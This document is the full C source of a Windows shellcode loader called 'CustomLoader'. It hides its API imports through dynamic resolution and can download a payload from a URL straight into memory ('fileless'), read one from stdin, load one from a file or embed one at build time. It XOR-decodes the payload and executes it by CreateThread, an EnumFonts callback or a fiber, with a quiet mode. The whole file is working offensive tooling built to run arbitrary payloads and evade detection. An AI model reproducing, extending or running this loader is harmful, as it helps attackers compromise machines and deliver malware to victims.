#include <windows.h>
#include <wininet.h>
#include <stdio.h>

// Dynamic API resolution — avoid static imports in IAT
typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef HANDLE (WINAPI *pCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD  (WINAPI *pWaitForSingleObject)(HANDLE, DWORD);
typedef BOOL   (WINAPI *pVirtualFree)(LPVOID, SIZE_T, DWORD);
typedef BOOL   (WINAPI *pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);

// WinInet dynamic resolution
typedef HINTERNET (WINAPI *pInternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
typedef HINTERNET (WINAPI *pInternetOpenUrlA)(HINTERNET, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
typedef BOOL      (WINAPI *pInternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL      (WINAPI *pInternetCloseHandle)(HINTERNET);

// XOR decode shellcode in-place
static void xor_decode(unsigned char *buf, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        buf[i] ^= key;
    }
}

// Read binary file into allocated buffer
static unsigned char *read_shellcode(const char *path, size_t *out_len) {
    HANDLE hFile = CreateFileA(path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return NULL;

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
        CloseHandle(hFile);
        return NULL;
    }

    unsigned char *buf = (unsigned char *)HeapAlloc(GetProcessHeap(), 0, fileSize);
    if (!buf) { CloseHandle(hFile); return NULL; }

    DWORD bytesRead = 0;
    if (!ReadFile(hFile, buf, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        HeapFree(GetProcessHeap(), 0, buf);
        CloseHandle(hFile);
        return NULL;
    }

    CloseHandle(hFile);
    *out_len = (size_t)fileSize;
    return buf;
}

// Fetch shellcode from URL directly into memory — never touches disk
static unsigned char *fetch_shellcode(const char *url, size_t *out_len) {
    HMODULE hWininet = LoadLibraryA("wininet.dll");
    if (!hWininet) return NULL;

    pInternetOpenA _InternetOpenA = (pInternetOpenA)GetProcAddress(hWininet, "InternetOpenA");
    pInternetOpenUrlA _InternetOpenUrlA = (pInternetOpenUrlA)GetProcAddress(hWininet, "InternetOpenUrlA");
    pInternetReadFile _InternetReadFile = (pInternetReadFile)GetProcAddress(hWininet, "InternetReadFile");
    pInternetCloseHandle _InternetCloseHandle = (pInternetCloseHandle)GetProcAddress(hWininet, "InternetCloseHandle");

    if (!_InternetOpenA || !_InternetOpenUrlA || !_InternetReadFile || !_InternetCloseHandle) {
        FreeLibrary(hWininet);
        return NULL;
    }

    HINTERNET hInternet = _InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) { FreeLibrary(hWininet); return NULL; }

    HINTERNET hUrl = _InternetOpenUrlA(hInternet, url, NULL, 0,
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_UI, 0);
    if (!hUrl) {
        _InternetCloseHandle(hInternet);
        FreeLibrary(hWininet);
        return NULL;
    }

    // Read in chunks into growing buffer
    size_t capacity = 4096;
    size_t total = 0;
    unsigned char *buf = (unsigned char *)HeapAlloc(GetProcessHeap(), 0, capacity);
    if (!buf) {
        _InternetCloseHandle(hUrl);
        _InternetCloseHandle(hInternet);
        FreeLibrary(hWininet);
        return NULL;
    }

    DWORD bytesRead = 0;
    while (_InternetReadFile(hUrl, buf + total, (DWORD)(capacity - total), &bytesRead) && bytesRead > 0) {
        total += bytesRead;
        if (total >= capacity) {
            capacity *= 2;
            unsigned char *newbuf = (unsigned char *)HeapReAlloc(GetProcessHeap(), 0, buf, capacity);
            if (!newbuf) {
                HeapFree(GetProcessHeap(), 0, buf);
                _InternetCloseHandle(hUrl);
                _InternetCloseHandle(hInternet);
                FreeLibrary(hWininet);
                return NULL;
            }
            buf = newbuf;
        }
        bytesRead = 0;
    }

    _InternetCloseHandle(hUrl);
    _InternetCloseHandle(hInternet);
    FreeLibrary(hWininet);

    if (total == 0) {
        HeapFree(GetProcessHeap(), 0, buf);
        return NULL;
    }

    *out_len = total;
    return buf;
}

// Read shellcode from stdin (pipe)
static unsigned char *read_stdin(size_t *out_len) {
    HANDLE hStdin = GetStdHandle(STD_INPUT_HANDLE);
    if (hStdin == INVALID_HANDLE_VALUE) return NULL;

    size_t capacity = 4096;
    size_t total = 0;
    unsigned char *buf = (unsigned char *)HeapAlloc(GetProcessHeap(), 0, capacity);
    if (!buf) return NULL;

    DWORD bytesRead = 0;
    while (ReadFile(hStdin, buf + total, (DWORD)(capacity - total), &bytesRead, NULL) && bytesRead > 0) {
        total += bytesRead;
        if (total >= capacity) {
            capacity *= 2;
            unsigned char *newbuf = (unsigned char *)HeapReAlloc(GetProcessHeap(), 0, buf, capacity);
            if (!newbuf) {
                HeapFree(GetProcessHeap(), 0, buf);
                return NULL;
            }
            buf = newbuf;
        }
        bytesRead = 0;
    }

    if (total == 0) {
        HeapFree(GetProcessHeap(), 0, buf);
        return NULL;
    }

    *out_len = total;
    return buf;
}

// --- Execution Methods ---

// Method 1: VirtualAlloc + CreateThread (classic)
static int exec_createthread(unsigned char *sc, size_t len) {
    HMODULE k32 = GetModuleHandleA("kernel32.dll");
    pVirtualAlloc _VirtualAlloc = (pVirtualAlloc)GetProcAddress(k32, "VirtualAlloc");
    pCreateThread _CreateThread = (pCreateThread)GetProcAddress(k32, "CreateThread");
    pWaitForSingleObject _WaitForSingleObject = (pWaitForSingleObject)GetProcAddress(k32, "WaitForSingleObject");
    pVirtualFree _VirtualFree = (pVirtualFree)GetProcAddress(k32, "VirtualFree");

    if (!_VirtualAlloc || !_CreateThread || !_WaitForSingleObject) return -1;

    LPVOID mem = _VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) return -1;

    memcpy(mem, sc, len);

    DWORD oldProtect;
    pVirtualProtect _VirtualProtect = (pVirtualProtect)GetProcAddress(k32, "VirtualProtect");
    if (!_VirtualProtect || !_VirtualProtect(mem, len, PAGE_EXECUTE_READ, &oldProtect)) {
        _VirtualFree(mem, 0, MEM_RELEASE);
        return -1;
    }

    HANDLE hThread = _CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    if (!hThread) {
        _VirtualFree(mem, 0, MEM_RELEASE);
        return -1;
    }

    _WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    _VirtualFree(mem, 0, MEM_RELEASE);
    return 0;
}

// Method 2: Callback execution via EnumFonts
typedef int (CALLBACK *FONTENUMPROCA)(const LOGFONTA *, const TEXTMETRICA *, DWORD, LPARAM);

static int exec_callback(unsigned char *sc, size_t len) {
    HMODULE k32 = GetModuleHandleA("kernel32.dll");
    pVirtualAlloc _VirtualAlloc = (pVirtualAlloc)GetProcAddress(k32, "VirtualAlloc");
    pVirtualProtect _VirtualProtect = (pVirtualProtect)GetProcAddress(k32, "VirtualProtect");
    pVirtualFree _VirtualFree = (pVirtualFree)GetProcAddress(k32, "VirtualFree");

    if (!_VirtualAlloc || !_VirtualProtect) return -1;

    LPVOID mem = _VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) return -1;

    memcpy(mem, sc, len);

    DWORD oldProtect;
    if (!_VirtualProtect(mem, len, PAGE_EXECUTE_READ, &oldProtect)) {
        _VirtualFree(mem, 0, MEM_RELEASE);
        return -1;
    }

    HDC hdc = GetDC(NULL);
    EnumFontsA(hdc, NULL, (FONTENUMPROCA)mem, 0);
    ReleaseDC(NULL, hdc);

    _VirtualFree(mem, 0, MEM_RELEASE);
    return 0;
}

// Method 3: Fiber execution
typedef LPVOID (WINAPI *pConvertThreadToFiber)(LPVOID);
typedef LPVOID (WINAPI *pCreateFiber)(SIZE_T, LPFIBER_START_ROUTINE, LPVOID);
typedef VOID   (WINAPI *pSwitchToFiber)(LPVOID);
typedef VOID   (WINAPI *pDeleteFiber)(LPVOID);

static int exec_fiber(unsigned char *sc, size_t len) {
    HMODULE k32 = GetModuleHandleA("kernel32.dll");
    pVirtualAlloc _VirtualAlloc = (pVirtualAlloc)GetProcAddress(k32, "VirtualAlloc");
    pVirtualProtect _VirtualProtect = (pVirtualProtect)GetProcAddress(k32, "VirtualProtect");
    pVirtualFree _VirtualFree = (pVirtualFree)GetProcAddress(k32, "VirtualFree");
    pConvertThreadToFiber _ConvertThreadToFiber = (pConvertThreadToFiber)GetProcAddress(k32, "ConvertThreadToFiber");
    pCreateFiber _CreateFiber = (pCreateFiber)GetProcAddress(k32, "CreateFiber");
    pSwitchToFiber _SwitchToFiber = (pSwitchToFiber)GetProcAddress(k32, "SwitchToFiber");
    pDeleteFiber _DeleteFiber = (pDeleteFiber)GetProcAddress(k32, "DeleteFiber");

    if (!_VirtualAlloc || !_VirtualProtect || !_ConvertThreadToFiber ||
        !_CreateFiber || !_SwitchToFiber || !_DeleteFiber) return -1;

    LPVOID mem = _VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) return -1;

    memcpy(mem, sc, len);

    DWORD oldProtect;
    if (!_VirtualProtect(mem, len, PAGE_EXECUTE_READ, &oldProtect)) {
        _VirtualFree(mem, 0, MEM_RELEASE);
        return -1;
    }

    LPVOID mainFiber = _ConvertThreadToFiber(NULL);
    if (!mainFiber) {
        _VirtualFree(mem, 0, MEM_RELEASE);
        return -1;
    }

    LPVOID scFiber = _CreateFiber(0, (LPFIBER_START_ROUTINE)mem, NULL);
    if (!scFiber) {
        _VirtualFree(mem, 0, MEM_RELEASE);
        return -1;
    }

    _SwitchToFiber(scFiber);
    _DeleteFiber(scFiber);
    _VirtualFree(mem, 0, MEM_RELEASE);
    return 0;
}

// --- Embedded shellcode support ---
// If compiled with -DEMBED, shellcode is baked into the binary
#ifdef EMBED
#include "shellcode.h"
#endif

static void print_usage(const char *name) {
    printf("CustomLoader — C Shellcode Loader\n\n");
    printf("Usage: %s [shellcode.bin | -u <url> | -s | -e] [options]\n\n", name);
    printf("Source (pick one):\n");
    printf("  <file>         Load shellcode from .bin file\n");
    printf("  -u <url>       Fetch shellcode from URL (fileless)\n");
    printf("  -s             Read shellcode from stdin pipe (fileless)\n");
    printf("  -e             Use embedded shellcode (compile with -DEMBED)\n");
    printf("\nOptions:\n");
    printf("  -m <method>    Execution method (default: 1)\n");
    printf("                   1 = CreateThread\n");
    printf("                   2 = Callback (EnumFonts)\n");
    printf("                   3 = Fiber\n");
    printf("  -x <key>       XOR decode key (0-255, for encoded payloads)\n");
    printf("  -q             Quiet mode — no console output\n");
    printf("  -h             Show this help\n");
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        print_usage(argv[0]);
        return 1;
    }

    const char *bin_path = NULL;
    const char *url = NULL;
    int method = 1;
    int xor_key = -1;
    int from_stdin = 0;
    int from_embed = 0;
    int quiet = 0;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-m") == 0 && i + 1 < argc) {
            method = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-x") == 0 && i + 1 < argc) {
            xor_key = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-u") == 0 && i + 1 < argc) {
            url = argv[++i];
        } else if (strcmp(argv[i], "-s") == 0) {
            from_stdin = 1;
        } else if (strcmp(argv[i], "-e") == 0) {
            from_embed = 1;
        } else if (strcmp(argv[i], "-q") == 0) {
            quiet = 1;
        } else if (strcmp(argv[i], "-h") == 0) {
            print_usage(argv[0]);
            return 0;
        } else {
            bin_path = argv[i];
        }
    }

    unsigned char *sc = NULL;
    size_t sc_len = 0;
    int need_free = 1;

    if (from_embed) {
#ifdef EMBED
        sc = embedded_shellcode;
        sc_len = embedded_shellcode_len;
        need_free = 0;
        if (!quiet) printf("[+] Embedded: %zu bytes\n", sc_len);
        // Copy to heap so we can XOR decode and zero it out
        unsigned char *copy = (unsigned char *)HeapAlloc(GetProcessHeap(), 0, sc_len);
        if (!copy) { printf("[-] Alloc failed\n"); return 1; }
        memcpy(copy, sc, sc_len);
        sc = copy;
        need_free = 1;
#else
        printf("[-] Not compiled with -DEMBED. Recompile with: gcc -DEMBED -o loader.exe loader.c -lwininet -lgdi32\n");
        return 1;
#endif
    } else if (url) {
        if (!quiet) printf("[+] Fetching from URL...\n");
        sc = fetch_shellcode(url, &sc_len);
        if (!sc) { printf("[-] Failed to fetch: %s\n", url); return 1; }
        if (!quiet) printf("[+] Downloaded: %zu bytes\n", sc_len);
    } else if (from_stdin) {
        if (!quiet) printf("[+] Reading from stdin...\n");
        sc = read_stdin(&sc_len);
        if (!sc) { printf("[-] Failed to read stdin\n"); return 1; }
        if (!quiet) printf("[+] Received: %zu bytes\n", sc_len);
    } else if (bin_path) {
        sc = read_shellcode(bin_path, &sc_len);
        if (!sc) { printf("[-] Failed to read: %s\n", bin_path); return 1; }
        if (!quiet) printf("[+] Loaded: %zu bytes\n", sc_len);
    } else {
        print_usage(argv[0]);
        return 1;
    }

    // XOR decode if key provided
    if (xor_key >= 0 && xor_key <= 255) {
        xor_decode(sc, sc_len, (unsigned char)xor_key);
        if (!quiet) printf("[+] XOR decoded (key: 0x%02X)\n", xor_key);
    }

    // Execute
    int result = -1;
    switch (method) {
        case 1:
            if (!quiet) printf("[+] Method: CreateThread\n");
            result = exec_createthread(sc, sc_len);
            break;
        case 2:
            if (!quiet) printf("[+] Method: Callback\n");
            result = exec_callback(sc, sc_len);
            break;
        case 3:
            if (!quiet) printf("[+] Method: Fiber\n");
            result = exec_fiber(sc, sc_len);
            break;
        default:
            printf("[-] Invalid method: %d\n", method);
            break;
    }

    // Cleanup
    if (need_free && sc) {
        SecureZeroMemory(sc, sc_len);
        HeapFree(GetProcessHeap(), 0, sc);
    }

    if (!quiet) {
        if (result == 0) printf("[+] Done.\n");
        else printf("[-] Execution failed.\n");
    }

    return result;
}
